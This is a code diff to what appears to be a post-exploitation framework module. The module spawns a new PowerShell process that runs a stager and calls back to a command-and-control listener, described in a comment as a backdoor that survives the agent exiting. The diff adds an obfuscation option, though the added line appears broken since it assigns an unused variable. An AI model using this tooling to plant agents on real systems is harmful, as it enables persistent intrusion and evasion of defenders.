@@ -1,3 +1,4 @@
+import os.path
 from lib.common import helpers
 
 class Module:
@@ -14,13 +15,13 @@ class Module:
             'Background' : False,
 
             'OutputExtension' : None,
-            
+
             'NeedsAdmin' : False,
 
             'OpsecSafe' : True,
 
             'MinPSVersion' : '2',
-            
+
             'Comments': []
         }
 
@@ -42,7 +43,7 @@ class Module:
                 'Description'   :   'Switch. Spawn a SysWow64 (32-bit) powershell.exe.',
                 'Required'      :   False,
                 'Value'         :   ''
-            },            
+            },
             'UserAgent' : {
                 'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                 'Required'      :   False,
@@ -71,8 +72,8 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
- 
+    def generate(self, obfuscate=False, obfuscationCommand=""):
+
         # extract all of our options
         listenerName = self.options['Listener']['Value']
         userAgent = self.options['UserAgent']['Value']
@@ -93,7 +94,7 @@ class Module:
             return ""
         else:
             # transform the backdoor into something launched by powershell.exe
-            # so it survives the agent exiting  
+            # so it survives the agent exiting
             if sysWow64.lower() == "true":
                 stagerCode = "$Env:SystemRoot\\SysWow64\\WindowsPowershell\\v1.0\\" + launcher
             else:
@@ -102,5 +103,9 @@ class Module:
             parts = stagerCode.split(" ")
 
             code = "Start-Process -NoNewWindow -FilePath \"%s\" -ArgumentList '%s'; 'Agent spawned to %s'" % (parts[0], " ".join(parts[1:]), listenerName)
-
+            if obfuscate:
+                script = helpers.obfuscate(psScript=script, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
             return code
+
+    def obfuscate(self, obfuscationCommand="", forceReobfuscation=False):
+        return
